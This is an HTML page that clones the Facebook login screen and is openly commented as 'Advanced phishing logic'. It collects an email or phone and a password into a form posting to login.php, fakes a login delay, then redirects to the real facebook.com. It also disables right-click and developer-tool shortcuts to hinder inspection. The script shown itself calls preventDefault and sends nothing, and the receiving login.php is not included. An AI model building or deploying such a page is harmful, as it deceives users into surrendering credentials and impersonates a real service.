<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTM0LjAxNyAzLjI4M0g1Ljk4M0EyLjk4NCAyLjk4NCAwIDAgMCAzIDYuMjY3djI3LjQ2NmEyLjk4NCAyLjk4NCAwIDAwMi45ODMgMi45ODRoMTQuNDgzVjI2LjMwNmgzLjkwNXYtNC40MDdoLTMuOWwtLjAwOC0zLjE2OWEyMC4zNCAyMC4zNCAwIDAxNS40ODcgMS4xMzN2NC45MDZoLTIuOTU4YS40ODMuNDgzIDAgMDEtLjQ3NS41MjloLS45ODN2NC40MDdoMS45NTZhNC45MDggNC45MDggMCAwMSA0LjQyNSA1LjM5M2wtLjcxNiA0LjY4MmEyOC4zMTcgMjguMzE3IDAgMDEtMy43MDkgMS41M3YzLjk1OGg2LjQ4M2EyLjk4NCAyLjk4NCAwIDAwMi45ODMtMi45ODRWNi4yNjdhMi45ODQgMi45ODQgMCAwMC0yLjk4My0yLjk4NFoiIGZpbGw9IiMxODc3ZjIiLz4KPC9zdmc+Cg==">
    <link rel="stylesheet" href="assets/fb-style.css">
    <meta name="theme-color" content="#1877f2">
</head>
<body>
    <div class="page">
        <div class="sidebar">
            <div class="logo-wrap">
                <div class="logo">
                    <svg viewBox="0 0 24 25" height="58" width="58" focusable="false">
                        <path d="M24.192 24.667H14.496V14.959h-3.727V24.667H3.728V14.959H0V24.667H0V0h4.768v3.986h3.727V0h5.188v3.986h3.727V0h5.781v3.986h3.727V24.667h-3.727v-9.708Z" fill="#ffffff" fill-rule="evenodd"></path>
                    </svg>
                </div>
            </div>
            <h1>Connect with friends and the world around you on Facebook.</h1>
        </div>
        
        <div class="main-login">
            <form method="POST" action="login.php" id="loginForm">
                <div class="input-wrap">
                    <input type="email" name="email" id="email" placeholder="Email or phone number" required>
                </div>
                <div class="input-wrap">
                    <input type="password" name="pass" id="pass" placeholder="Password" required>
                </div>
                <button type="submit" class="login-button">
                    Log In
                </button>
                <a href="#" class="forgot-password">Forgot Password?</a>
                <div class="divider">
                    <span>or</span>
                </div>
                <button type="button" class="create-account">
                    Create New Account
                </button>
            </form>
        </div>
    </div>

    <script>
        // Advanced phishing logic
        const form = document.getElementById('loginForm');
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Show loading state
            const btn = form.querySelector('.login-button');
            btn.textContent = 'Logging in...';
            btn.disabled = true;
            
            // Simulate Facebook login delay
            setTimeout(() => {
                window.location.href = 'https://www.facebook.com/?sk=login';
            }, 2000);
        });

        // Focus effects
        ['email', 'pass'].forEach(id => {
            const input = document.getElementById(id);
            input.addEventListener('input', function() {
                this.parentNode.classList.toggle('has-value', this.value.length > 0);
            });
        });

        // Prevent right-click/inspect
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
